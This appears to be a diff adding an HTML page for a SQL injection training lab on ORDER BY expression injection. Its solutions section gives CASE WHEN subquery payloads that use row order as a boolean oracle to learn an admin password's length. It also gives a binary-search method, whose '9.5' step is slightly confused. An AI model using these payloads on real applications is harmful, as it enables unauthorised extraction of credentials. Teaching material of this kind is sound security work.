@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>SQLi Lab 10 — ORDER BY Expression Injection</title>
+    <script>
+      (function () {
+        var t = new URLSearchParams(location.search).get("theme");
+        if (t) document.documentElement.dataset.theme = t;
+      })();
+    </script>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/components.css" />
+    <link rel="stylesheet" href="../../../css/labs.css" />
+  </head>
+  <body>
+    <div class="lab-page">
+      <div class="lab-brand">
+        <strong>SQL INJECTION / LAB 10</strong
+        ><span>ORDER BY Expression Injection</span>
+      </div>
+      <div class="lab-container">
+        <h1>ORDER BY Expression Injection</h1>
+        <p class="lead">
+          The ORDER BY column isn't a value — it's an expression. That means you
+          can drop a CASE, a subquery, or a whole boolean oracle into it and
+          leak data through the <em>order</em> of the rows, even when nothing
+          about them is returned.
+        </p>
+
+        <div class="lab-card">
+          <div class="eyebrow">PRODUCT LIST</div>
+          <label>Category</label>
+          <input id="cat" class="lab-input" value="tools" autocomplete="off" />
+          <label>Sort by (expression)</label>
+          <input id="sort" class="lab-input" value="name" autocomplete="off" />
+          <button id="run" class="lab-btn">RUN</button>
+          <div id="output"></div>
+        </div>
+
+        <div class="lab-card">
+          <div class="eyebrow">CHALLENGES</div>
+          <div class="challenge">
+            <strong>01 — Sort by a computed value</strong
+            ><small>Use an expression instead of a column name.</small>
+          </div>
+          <div class="challenge">
+            <strong>02 — Oracle: is the admin password longer than 8?</strong
+            ><small
+              >Use a CASE in the sort that returns "name" or "cost" depending on
+              the answer. Watch what comes first.</small
+            >
+          </div>
+          <div class="challenge">
+            <strong>03 — Binary-search the password length</strong
+            ><small
+              >Without ever seeing the value, narrow it down using LENGTH() and
+              the sort order.</small
+            >
+          </div>
+          <details class="lab-solutions">
+            <summary>View solutions</summary>
+
+            <div class="solution">
+              <strong>01 — Expression sort</strong>
+              <pre><code>Sort by: length(name) DESC</code></pre>
+            </div>
+
+            <div class="solution">
+              <strong>02 — One boolean oracle</strong>
+              <pre><code>Sort by: CASE WHEN (SELECT length(password) FROM users WHERE name='admin') &gt; 8 THEN name ELSE cost END</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                If the first row is alphabetical, the password is longer than 8.
+                Otherwise it's shorter.
+              </p>
+            </div>
+
+            <div class="solution">
+              <strong>03 — Binary search</strong>
+              <small
+                >Change the constant and watch the first row's identity.</small
+              >
+              <pre><code>Sort by: CASE WHEN (SELECT length(password) FROM users WHERE name='admin') &gt; 9 THEN name ELSE cost END</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                9 → 10 → 9.5 etc. Each run answers one question. In &lt;20 runs
+                you have the exact length.
+              </p>
+            </div>
+          </details>
+          <button id="reset" class="lab-btn secondary">RESET</button>
+        </div>
+
+        <script src="script.js"></script>
+      </div>
+    </div>
+  </body>
+</html>
